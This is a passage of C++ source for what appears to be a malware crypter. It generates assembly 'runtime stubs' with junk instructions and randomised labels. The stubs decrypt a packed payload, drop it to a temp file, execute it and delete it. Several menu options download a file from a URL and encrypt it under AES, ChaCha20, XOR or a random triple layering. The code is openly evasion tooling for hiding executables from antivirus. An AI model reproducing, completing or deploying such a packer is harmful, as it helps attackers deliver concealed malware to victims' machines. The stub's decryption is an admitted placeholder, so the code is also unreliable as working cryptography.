    invoke ReadFile, file_handle, )" + bufferLabel + R"(, )" + sizeLabel + R"(, addr bytes_read, NULL
    invoke CloseHandle, file_handle
    
    ; More junk instructions
    mov ebx, 87654321h
    add ebx, 11111111h
    sub ebx, 11111111h
    
    call )" + decryptLabel + R"(
    call )" + execLabel + R"(
    
    invoke GlobalFree, )" + bufferLabel + R"(
    invoke ExitProcess, 0

)" + decryptLabel + R"(:
    ; Polymorphic decryption routine
    ; This is a simplified version - full implementation would include
    ; ChaCha20, AES stream cipher, and XOR algorithms
    
    mov esi, )" + bufferLabel + R"(
    mov ecx, )" + sizeLabel + R"(
    mov edx, 0
    
decrypt_loop_)" + std::to_string(rng() % 1000) + R"(:
    cmp ecx, 0
    je decrypt_done_)" + std::to_string(rng() % 1000) + R"(
    
    ; Simple XOR decryption (placeholder for full implementation)
    mov al, byte ptr [esi + edx]
    xor al, 55h  ; Simplified key
    mov byte ptr [esi + edx], al
    
    inc edx
    dec ecx
    jmp decrypt_loop_)" + std::to_string(rng() % 1000) + R"(
    
decrypt_done_)" + std::to_string(rng() % 1000) + R"(:
    ret

)" + execLabel + R"(:
    ; Write decrypted data to temp file
    invoke CreateFileA, addr temp_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    cmp eax, INVALID_HANDLE_VALUE
    je error_exit
    mov file_handle, eax
    
    invoke WriteFile, file_handle, )" + bufferLabel + R"(, )" + sizeLabel + R"(, addr bytes_read, NULL
    invoke CloseHandle, file_handle
    
    ; Execute the temp file
    mov startup_info.cb, sizeof STARTUPINFOA
    invoke CreateProcessA, addr temp_file, NULL, NULL, NULL, FALSE, 0, NULL, NULL, addr startup_info, addr process_info
    
    cmp eax, 0
    je error_exit
    
    invoke WaitForSingleObject, process_info.hProcess, INFINITE
    invoke CloseHandle, process_info.hProcess
    invoke CloseHandle, process_info.hThread
    
    ; Clean up temp file
    invoke DeleteFileA, addr temp_file
    ret

error_exit:
    invoke MessageBoxA, NULL, addr error_msg, addr error_msg, MB_OK
    invoke ExitProcess, 1

end )" + mainLabel + R"(
)";

        // Save the MASM stub
        std::string outputFile = "runtime_stub_" + std::to_string(rng() % 10000) + ".asm";
        std::ofstream outFile(outputFile);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile << masmCode;
        outFile.close();

        std::cout << "✅ MASM Runtime Stub generated successfully!" << std::endl;
        std::cout << "📁 Output: " << outputFile << std::endl;
        std::cout << "🎯 Target file: " << targetFile << std::endl;
        std::cout << "🔢 Encryption order: " << keys.encryption_order << std::endl;
        std::cout << "📋 Assemble with: ml /c /coff " << outputFile << std::endl;
        std::cout << "📋 Link with: link /subsystem:windows " << outputFile.substr(0, outputFile.find('.')) << ".obj" << std::endl;
        std::cout << "⚠️  Note: This is a lightweight stub. Full decryption algorithms need manual implementation." << std::endl;
        
        // Auto-compile the generated MASM file
        autoCompile(outputFile);
    }

    // URL Crypto Service - AES (option 6)
    void urlCryptoServiceAES() {
        std::string url;
        std::cout << "Enter URL to download: ";
        std::getline(std::cin, url);

        std::vector<uint8_t> fileData;
        if (!downloadFile(url, fileData)) {
            std::cout << "❌ Failed to download file from URL" << std::endl;
            return;
        }

        // Generate AES key
        auto keys = generateKeys();
        std::vector<uint8_t> encryptedData = fileData;
        aesStreamCrypt(encryptedData, keys.aes_key);

        // Save encrypted file
        std::string outputFile = "url_encrypted_aes_" + std::to_string(rng() % 10000) + ".bin";
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size());
        outFile.close();

        // Save key information
        std::string keyFile = outputFile + ".key";
        std::ofstream keyOut(keyFile);
        if (keyOut) {
            keyOut << "AES Key (Decimal): " << bytesToBigDecimal(keys.aes_key) << std::endl;
            keyOut << "Original Size: " << fileData.size() << " bytes" << std::endl;
            keyOut << "Encrypted Size: " << encryptedData.size() << " bytes" << std::endl;
            keyOut.close();
        }

        std::cout << "✅ URL file encrypted with AES successfully!" << std::endl;
        std::cout << "📁 Encrypted file: " << outputFile << std::endl;
        std::cout << "🔑 Key file: " << keyFile << std::endl;
        std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "🌐 Source URL: " << url << std::endl;
    }

    // URL Crypto Service - Triple Encryption (option 7)
    void urlCryptoServiceTriple() {
        std::string url;
        std::cout << "Enter URL to download: ";
        std::getline(std::cin, url);

        std::vector<uint8_t> fileData;
        if (!downloadFile(url, fileData)) {
            std::cout << "❌ Failed to download file from URL" << std::endl;
            return;
        }

        // Generate all keys
        auto keys = generateKeys();
        std::vector<uint8_t> encryptedData = fileData;
        
        // Apply triple encryption with randomized order
        switch (keys.encryption_order) {
            case 0: // ChaCha20 -> AES -> XOR
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                aesStreamCrypt(encryptedData, keys.aes_key);
                xorCrypt(encryptedData, keys.xor_key);
                break;
            case 1: // ChaCha20 -> XOR -> AES
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                xorCrypt(encryptedData, keys.xor_key);
                aesStreamCrypt(encryptedData, keys.aes_key);
                break;
            case 2: // AES -> ChaCha20 -> XOR
                aesStreamCrypt(encryptedData, keys.aes_key);
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                xorCrypt(encryptedData, keys.xor_key);
                break;
            case 3: // AES -> XOR -> ChaCha20
                aesStreamCrypt(encryptedData, keys.aes_key);
                xorCrypt(encryptedData, keys.xor_key);
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                break;
            case 4: // XOR -> ChaCha20 -> AES
                xorCrypt(encryptedData, keys.xor_key);
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                aesStreamCrypt(encryptedData, keys.aes_key);
                break;
            case 5: // XOR -> AES -> ChaCha20
                xorCrypt(encryptedData, keys.xor_key);
                aesStreamCrypt(encryptedData, keys.aes_key);
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                break;
        }

        // Save encrypted file
        std::string outputFile = "url_encrypted_triple_" + std::to_string(rng() % 10000) + ".bin";
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size());
        outFile.close();

        // Save key information
        std::string keyFile = outputFile + ".key";
        std::ofstream keyOut(keyFile);
        if (keyOut) {
            keyOut << "Triple Encryption Keys (Decimal):" << std::endl;
            keyOut << "ChaCha20 Key: " << bytesToBigDecimal(keys.chacha_key) << std::endl;
            keyOut << "ChaCha20 Nonce: " << bytesToBigDecimal(keys.chacha_nonce) << std::endl;
            keyOut << "AES Key: " << bytesToBigDecimal(keys.aes_key) << std::endl;
            keyOut << "XOR Key: " << bytesToBigDecimal(keys.xor_key) << std::endl;
            keyOut << "Encryption Order: " << keys.encryption_order << std::endl;
            keyOut << "Original Size: " << fileData.size() << " bytes" << std::endl;
            keyOut << "Encrypted Size: " << encryptedData.size() << " bytes" << std::endl;
            keyOut.close();
        }

        std::cout << "✅ URL file encrypted with Triple Encryption successfully!" << std::endl;
        std::cout << "📁 Encrypted file: " << outputFile << std::endl;
        std::cout << "🔑 Key file: " << keyFile << std::endl;
        std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "🔢 Encryption order: " << keys.encryption_order << std::endl;
        std::cout << "🌐 Source URL: " << url << std::endl;
    }

    // URL Crypto Service - ChaCha20 (option 8)
    void urlCryptoServiceChaCha20() {
        std::string url;
        std::cout << "Enter URL to download: ";
        std::getline(std::cin, url);

        std::vector<uint8_t> fileData;
        if (!downloadFile(url, fileData)) {
            std::cout << "❌ Failed to download file from URL" << std::endl;
            return;
        }

        // Generate ChaCha20 key and nonce
        auto keys = generateKeys();
        std::vector<uint8_t> encryptedData = fileData;
        chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());

        // Save encrypted file
        std::string outputFile = "url_encrypted_chacha20_" + std::to_string(rng() % 10000) + ".bin";
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size());
        outFile.close();

        // Save key information
        std::string keyFile = outputFile + ".key";
        std::ofstream keyOut(keyFile);
        if (keyOut) {
            keyOut << "ChaCha20 Key (Decimal): " << bytesToBigDecimal(keys.chacha_key) << std::endl;
            keyOut << "ChaCha20 Nonce (Decimal): " << bytesToBigDecimal(keys.chacha_nonce) << std::endl;
            keyOut << "Original Size: " << fileData.size() << " bytes" << std::endl;
            keyOut << "Encrypted Size: " << encryptedData.size() << " bytes" << std::endl;
            keyOut.close();
        }

        std::cout << "✅ URL file encrypted with ChaCha20 successfully!" << std::endl;
        std::cout << "📁 Encrypted file: " << outputFile << std::endl;
        std::cout << "🔑 Key file: " << keyFile << std::endl;
        std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "🌐 Source URL: " << url << std::endl;
    }

    // URL Crypto Service - Basic (option 9)
    void urlCryptoServiceBasic() {
        std::string url;
        std::cout << "Enter URL to download: ";
        std::getline(std::cin, url);

        std::vector<uint8_t> fileData;
        if (!downloadFile(url, fileData)) {
            std::cout << "❌ Failed to download file from URL" << std::endl;
            return;
        }

        // Generate keys and apply basic encryption
        auto keys = generateKeys();
        std::vector<uint8_t> encryptedData = fileData;
        
        // Apply simple XOR encryption for basic mode
        xorCrypt(encryptedData, keys.xor_key);

        // Save encrypted file
        std::string outputFile = "url_encrypted_basic_" + std::to_string(rng() % 10000) + ".bin";
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size());
        outFile.close();

        // Save key information
        std::string keyFile = outputFile + ".key";
        std::ofstream keyOut(keyFile);
        if (keyOut) {
            keyOut << "Basic XOR Key (Decimal): " << bytesToBigDecimal(keys.xor_key) << std::endl;
            keyOut << "Original Size: " << fileData.size() << " bytes" << std::endl;
            keyOut << "Encrypted Size: " << encryptedData.size() << " bytes" << std::endl;
            keyOut.close();
        }

        std::cout << "✅ URL file encrypted with Basic encryption successfully!" << std::endl;
        std::cout << "📁 Encrypted file: " << outputFile << std::endl;
        std::cout << "🔑 Key file: " << keyFile << std::endl;
        std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "🌐 Source URL: " << url << std::endl;
    }
    // URL Pack File - AES (option 10)
    void urlPackFileAES() {
        std::string url;
